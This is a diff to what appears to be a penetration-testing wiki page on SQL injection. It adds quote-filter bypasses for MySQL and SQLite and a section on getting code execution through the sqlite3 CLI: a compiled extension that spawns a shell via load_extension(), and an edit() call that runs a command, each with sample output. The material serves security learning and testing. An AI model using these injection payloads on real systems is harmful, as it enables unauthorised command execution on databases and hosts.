@@ -33,4 +33,59 @@ Also try 'Second-Order' injection, by doing another injection inside of your `UN
 
 ### Filter Bypass
 
-* Quotes (`'` & `"`): Use `0x6a307231616e` instead of `"j0r1an"` ([CyberChef](https://gchq.github.io/CyberChef/#recipe=To\_Hex\('None',0\)Find\_/\_Replace\(%7B'option':'Regex','string':'.\*'%7D,'0x$%26',false,false,false,false\)\&input=ajByMWFu))
+Some scenarios where you can bypass character limits using functions or special syntax. \
+**`+`** means supported in more than just the mentioned DB backend.
+
+* Quotes (`'` & `"`) like `"j0r1an"`:&#x20;
+  * Use `0x6a307231616e` in **MySQL**: [CyberChef](https://gchq.github.io/CyberChef/#recipe=To\_Hex\('None',0\)Find\_/\_Replace\(%7B'option':'Regex','string':'.\*'%7D,'0x$%26',false,false,false,false\)\&input=ajByMWFu)
+  * Use [`char(106,48,114,49,97,110)`](https://www.sqlite.org/lang\_corefunc.html#char) in **SQLite+**: [CyberChef](https://gchq.github.io/CyberChef/#recipe=To\_Decimal\('Comma',false\)Find\_/\_Replace\(%7B'option':'Regex','string':'.\*'%7D,'char\($%26\)',false,false,true,true\)\&input=ajByMWFu)
+
+## SQLite
+
+Tricks specific to the SQLite database backend.
+
+### RCE through CLI
+
+While looking through the documentation, you might notice functions that seem to have the ability to run arbitrary code on the system. The catch is that these methods are only possible using the `sqlite3` CLI tool by default, only with some very specific configuration will they be available through a normal library that uses the safer C-API behind the scenes.&#x20;
+
+#### [`load_extension()`](https://www.sqlite.org/lang\_corefunc.html#load\_extension)
+
+SQLite uses the C-API for all the heavy work, and the CLI as well as libraries are just wrappers over this. The `load_extension()` function is special as it can only be called after calling the `enable_load_extension()` function from the C-API, which is not available in SQL syntax. Fortunately, the **CLI enables this automatically** which means that if we are able to inject code into such a query, we can load extensions.&#x20;
+
+These extensions are simply compiled C code in the form of `.so` files, with an init function:
+
+<pre class="language-c" data-title="extension.c"><code class="lang-c">#include &#x3C;sqlite3ext.h>
+SQLITE_EXTENSION_INIT1
+
+#include &#x3C;stdlib.h>
+#include &#x3C;unistd.h>
+
+int sqlite3_extension_init(sqlite3 *db, char **pzErrMsg, const sqlite3_api_routines *pApi) {
+  SQLITE_EXTENSION_INIT2(pApi);
+
+<strong>  execve("/bin/sh", NULL, NULL);  // Spawn an interactive shell
+</strong>
+  return SQLITE_OK;
+}
+</code></pre>
+
+```shell-session
+$ gcc -s -g -fPIC -shared extension.c -o extension.so
+```
+
+Then from inside a CLI query, we can call the function with a path to the compiled extension:
+
+<pre class="language-sql"><code class="lang-sql"><strong>sqlite> select load_extension('./extension');
+</strong>$ id
+uid=1001(user) gid=1001(user) groups=1001(user)
+</code></pre>
+
+#### [`edit()`](https://www.sqlite.org/cli.html#the\_edit\_sql\_function)
+
+The CLI also includes an extra special function used for editing data interactively, which allows its 2nd argument to decide what command to run! It is very straightforward to exploit:
+
+<pre class="language-sql"><code class="lang-sql"><strong>sqlite> select edit(1,'id;');
+</strong>uid=1001(user) gid=1001(user) groups=1001(user)
+sh: 1: temp9385525e2ea5301f: not found
+Error: EDITOR returned non-zero
+</code></pre>
